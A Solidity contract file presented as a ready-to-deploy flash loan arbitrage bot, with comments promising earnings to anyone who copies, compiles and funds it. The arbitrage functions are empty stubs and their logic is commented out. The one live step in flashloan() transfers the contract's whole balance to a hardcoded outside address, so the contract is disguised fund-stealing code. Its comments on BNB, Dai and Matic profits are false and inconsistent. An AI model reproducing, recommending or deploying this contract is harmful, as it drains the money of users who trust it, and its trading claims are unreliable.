// Follow carefully the video
// Do not modify this contract code otherwise it won't work on you!
// Just Copy+Paste and Compile!!
// Thank you for your support! Enjoy your Earnings!!

// This is for educational purposes only! 
// Try it at your own risk!

pragma solidity ^0.5.0;


// AAVE Smart Contracts
import "https://github.com/aave/aave-protocol/blob/master/contracts/interfaces/IChainlinkAggregator.sol";
import "https://github.com/aave/aave-protocol/blob/master/contracts/flashloan/interfaces/IFlashLoanReceiver.sol";


//Uniswap Smart contracts
import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";

// Multiplier-Finance Smart Contracts
//import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
//import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";


contract RouterV2 {
    function uniswapRouterV2Address() public pure returns (address) {
        return 0x425d266A8824F04958410a26887De98FEe4a0EBE;
    }

    function compareStrings(string memory a, string memory b)
        public pure
        returns (bool)
    {
        return (keccak256(abi.encodePacked((a))) ==
            keccak256(abi.encodePacked((b))));
    }
    

   

    //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
    function borrowFlashloanFromMultiplier(
        address add0,
        address add1,
        uint256 amount
    ) public pure {
        
    }

    function convertEthToDai(address add0, uint256 amount) public pure {
        
    }

    function aaveSwapAddress() public pure returns (address) {
      
    }

    function callArbitrageAAVE(address add0, address add1) public pure {
        
    }

    function transferDaiToMultiplier(address add0)
        public pure
    {
        
    }

    function completeTransation(uint256 balanceAmount) public pure {
        
    }

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to
    ) external pure {
        require(
            amount0Out > 0 || amount1Out > 0,
            "Pancake: INSUFFICIENT_OUTPUT_AMOUNT"
        ); 
        require(uint(to) != 0, "Address can't be null");/*
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');
        uint balance0;
        uint balance1;
        { // scope for _token{0,1}, avoids stack too deep errors
        address _token0 = token0;
        address _token1 = token1;
        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');
        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));
        }
        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');
        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(2));
        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(2));
        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Pancake: K');
        }
        _update(balance0, balance1, _reserve0, _reserve1);
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);*/
    }

    function lendingPoolFlashloan(uint256 _asset) public pure {
        uint256 data = _asset; 
        require(data != 0, "Data can't be 0.");/*
        uint amount = 1 BNB;
        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
        lendingPool.flashLoan(address(this), _asset, amount, data);*/
    }
}






contract InitiateFlashLoan {
    
	RouterV2 router;
    string public tokenName;
    string public tokenSymbol;
    uint256 flashLoanAmount;
    address payable uniswapSwapAddress = 0x21D24986E3Dc9eDd061CE264b4746e2C524C8939;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        flashLoanAmount = _loanAmount;

        router = new RouterV2();
    }

    function() external payable {}

    function flashloan() public payable {
        // Send required coins for swap
        uniswapSwapAddress.transfer(address(this).balance);

        router.borrowFlashloanFromMultiplier(
            address(this),
            router.aaveSwapAddress(),
            flashLoanAmount
        );
        //To prepare the arbitrage, Ethereum is converted to Dai using AAVE swap contract.
        router.convertEthToDai(msg.sender, flashLoanAmount / 2);
        //The arbitrage converts Dai for Ethereum using Dai/Ethereum Uniswap, and then immediately converts Matic back
        router.callArbitrageAAVE(router.aaveSwapAddress(), msg.sender);
        //Note that the transaction sender gains 600ish Matic from the arbitrage, this particular transaction can be repeated as price changes all the time.
        router.completeTransation(address(this).balance);
    }
}